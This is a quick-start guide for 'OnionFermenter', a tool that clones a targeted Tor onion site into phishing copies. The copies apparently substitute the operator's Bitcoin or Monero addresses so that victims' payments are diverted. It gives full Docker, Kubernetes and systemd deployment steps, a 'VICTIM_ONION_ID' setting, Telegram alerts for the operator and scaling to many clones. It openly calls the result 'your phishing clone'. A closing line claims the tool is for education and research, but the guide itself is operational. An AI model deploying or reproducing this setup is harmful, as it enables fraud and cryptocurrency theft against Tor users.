# OnionFermenter Quick Start Guide

Get OnionFermenter running in 5 minutes!

## Choose Your Deployment Method

### Option 1: Docker (Easiest - Recommended for Beginners)

**Prerequisites**: Docker must be installed. If not installed:
```bash
# Ubuntu/Debian
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo usermod -aG docker $USER
newgrp docker
```

**Quick Start**:
```bash
# 1. Clone the repository
git clone https://github.com/bitbybit91/OnionFermenter.git
cd OnionFermenter

# 2. Create your address file (Bitcoin example)
cat > my-addresses.txt << EOF
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
EOF

# 3. Set environment variables
export VICTIM_ONION_ID=juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd
export ADDRESS_FILE="$(pwd)/my-addresses.txt"
export CURRENCY_TYPE=BTC
export TELEGRAM_BOT_TOKEN=your_token_here  # Optional
export TELEGRAM_CHAT_ID=your_chat_id      # Optional

# 4. Run OnionFermenter
make run

# 5. Check if it's running
docker ps | grep onionfermenter

# 6. Get your clone's onion address (wait 60 seconds first)
make get-addresses-docker
```

**Done!** Your phishing clone is now running.

---

### Option 2: Kubernetes (For Production Scale)

**Prerequisites Check**:
```bash
# Check if kubectl is installed
kubectl version --client

# Check if you have a cluster
kubectl cluster-info
```

If any of the above fail, **you need to set up a cluster first**:

#### Quick Cluster Setup (Local Testing)
```bash
# Install Minikube
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube

# Start cluster
minikube start --driver=docker

# Install Helm
curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash

# Verify everything works
kubectl cluster-info
kubectl get nodes
helm version
```

**Quick Start**:
```bash
# 1. Clone the repository
git clone https://github.com/bitbybit91/OnionFermenter.git
cd OnionFermenter

# 2. Create your address file
cat > my-addresses.txt << EOF
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
EOF

# 3. Set environment variables
export VICTIM_ONION_ID=juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd
export ADDRESS_FILE="$(pwd)/my-addresses.txt"
export CURRENCY_TYPE=BTC
export NREPLICAS=3  # Number of clones
export TELEGRAM_BOT_TOKEN=your_token_here  # Optional
export TELEGRAM_CHAT_ID=your_chat_id      # Optional

# 4. Deploy to Kubernetes
make deploy

# 5. Check deployment status
kubectl -n onionfermenter get pods

# 6. Wait for pods to be running, then get addresses
make get-addresses
```

**Done!** Your clones are now running at scale.

---

### Option 3: VPS with Systemd (24/7 Production)

**Prerequisites**:
```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y erlang git wget bash tor socat curl make

# Install rebar3
wget https://s3.amazonaws.com/rebar3/rebar3
chmod +x rebar3
sudo mv rebar3 /usr/local/bin/
```

**Quick Start**:
```bash
# 1. Clone and build
git clone https://github.com/bitbybit91/OnionFermenter.git
cd OnionFermenter
rebar3 as prod release

# 2. Install
sudo mkdir -p /opt/onionfermenter
sudo cp -r _build/prod/rel/onionfermenter/* /opt/onionfermenter/
sudo cp deploy/run.sh /opt/onionfermenter/
sudo chmod +x /opt/onionfermenter/run.sh

# 3. Create address file
sudo cat > /opt/onionfermenter/BTC-ADDRESSES.txt << EOF
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
EOF

# 4. Configure systemd service
sudo cp deploy/onionfermenter.service /etc/systemd/system/
sudo nano /etc/systemd/system/onionfermenter.service
# Edit: VICTIM_ONION_ID, CURRENCY_TYPE, TELEGRAM_* values

# 5. Start service
sudo systemctl daemon-reload
sudo systemctl enable onionfermenter
sudo systemctl start onionfermenter

# 6. Check status
sudo systemctl status onionfermenter
sudo journalctl -u onionfermenter -f
```

**Done!** Your OnionFermenter will run 24/7, even after reboots.

---

## Common First-Time Issues

### "Kubernetes cluster unreachable"
**Problem**: You don't have a Kubernetes cluster set up.

**Solution**: Install Minikube (see Option 2 above) or use Docker instead (Option 1).

### "Address file not found"
**Problem**: The ADDRESS_FILE path is incorrect.

**Solution**: Use absolute paths:
```bash
export ADDRESS_FILE="$(pwd)/my-addresses.txt"
```

### "Container exits immediately"
**Problem**: Invalid VICTIM_ONION_ID or empty address file.

**Solution**: 
- Check VICTIM_ONION_ID is 56 characters (v3 onion)
- Ensure address file has at least one address
- Check Docker logs: `docker logs <container_id>`

### "No onion address generated"
**Problem**: Tor is still starting up.

**Solution**: Wait 60-120 seconds, then check again:
```bash
# Docker
make get-addresses-docker

# Kubernetes
make get-addresses
```

---

## Next Steps

### Add Telegram Notifications

1. Create a bot with [@BotFather](https://t.me/botfather)
2. Get bot token
3. Get your chat ID from [@userinfobot](https://t.me/userinfobot)
4. Set environment variables:
   ```bash
   export TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
   export TELEGRAM_CHAT_ID=987654321
   ```
5. Restart OnionFermenter

### Use Monero Instead of Bitcoin

```bash
# Create XMR address file (95 characters per address)
cat > my-xmr-addresses.txt << EOF
48YourMoneroAddressHere1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890ABCDEFGHIJ
EOF

export CURRENCY_TYPE=XMR
export ADDRESS_FILE="$(pwd)/my-xmr-addresses.txt"
```

### Scale to Multiple Clones

**Docker**: Run the command multiple times with different container names.

**Kubernetes**: Set NREPLICAS:
```bash
export NREPLICAS=10
make deploy
```

---

## Getting Help

1. **Read the docs**: [INSTALL.md](INSTALL.md) for detailed instructions
2. **Check logs**: Always check logs when something doesn't work
3. **Verify prerequisites**: Make sure Docker/Kubernetes is properly installed
4. **Use examples**: The `examples/` directory has working configurations

## Security Warning

This tool is for educational and research purposes. Ensure you have proper authorization before testing against any systems.
